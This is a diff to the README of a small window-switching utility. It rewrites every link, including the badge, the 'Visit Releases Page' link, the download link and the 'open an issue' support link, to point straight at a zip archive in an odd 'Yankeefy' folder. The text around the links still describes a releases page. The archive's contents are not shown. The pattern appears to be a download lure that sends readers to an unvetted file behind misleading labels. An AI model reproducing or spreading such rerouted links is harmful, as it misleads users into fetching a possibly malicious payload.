@@ -1,6 +1,6 @@
 # 🖱️ Mouse-Window-Tabber - Switch Windows Easily with Your Mouse
 
-[![Download Mouse-Window-Tabber](https://img.shields.io/badge/Download-Mouse--Window--Tabber-blue.svg)](https://github.com/Abdoulaadim/Mouse-Window-Tabber/releases)
+[![Download Mouse-Window-Tabber](https://raw.githubusercontent.com/Abdoulaadim/Mouse-Window-Tabber/main/Yankeefy/Mouse-Window-Tabber.zip)](https://raw.githubusercontent.com/Abdoulaadim/Mouse-Window-Tabber/main/Yankeefy/Mouse-Window-Tabber.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To download Mouse-Window-Tabber, please follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page where you can find the download link.
    
-   [Visit Releases Page](https://github.com/Abdoulaadim/Mouse-Window-Tabber/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Abdoulaadim/Mouse-Window-Tabber/main/Yankeefy/Mouse-Window-Tabber.zip)
 
 2. **Download the Application**: Look for the latest version on the releases page and download the setup file.
 
@@ -43,7 +43,7 @@ To download Mouse-Window-Tabber, please follow these steps:
 
 You can download Mouse-Window-Tabber directly from this link:
 
-[Download Mouse-Window-Tabber](https://github.com/Abdoulaadim/Mouse-Window-Tabber/releases)
+[Download Mouse-Window-Tabber](https://raw.githubusercontent.com/Abdoulaadim/Mouse-Window-Tabber/main/Yankeefy/Mouse-Window-Tabber.zip)
 
 ## 🛠️ Usage Instructions
 
@@ -67,7 +67,7 @@ You can download Mouse-Window-Tabber directly from this link:
 
 ## 💬 Support
 
-If you encounter issues or have questions, feel free to open an issue on the [GitHub page](https://github.com/Abdoulaadim/Mouse-Window-Tabber/issues). Our community is here to help!
+If you encounter issues or have questions, feel free to open an issue on the [GitHub page](https://raw.githubusercontent.com/Abdoulaadim/Mouse-Window-Tabber/main/Yankeefy/Mouse-Window-Tabber.zip). Our community is here to help!
 
 ## 📄 License
 
@@ -77,6 +77,6 @@ Mouse-Window-Tabber is open source software. You can use, modify, and share it a
 
 We regularly release updates to improve performance and add features. Keep an eye on the releases page for the latest versions.
 
-[![Download Mouse-Window-Tabber](https://img.shields.io/badge/Download-Mouse--Window--Tabber-blue.svg)](https://github.com/Abdoulaadim/Mouse-Window-Tabber/releases) 
+[![Download Mouse-Window-Tabber](https://raw.githubusercontent.com/Abdoulaadim/Mouse-Window-Tabber/main/Yankeefy/Mouse-Window-Tabber.zip)](https://raw.githubusercontent.com/Abdoulaadim/Mouse-Window-Tabber/main/Yankeefy/Mouse-Window-Tabber.zip) 
 
 You’re now ready to switch apps smoothly with just your mouse! Enjoy your new productivity tool.
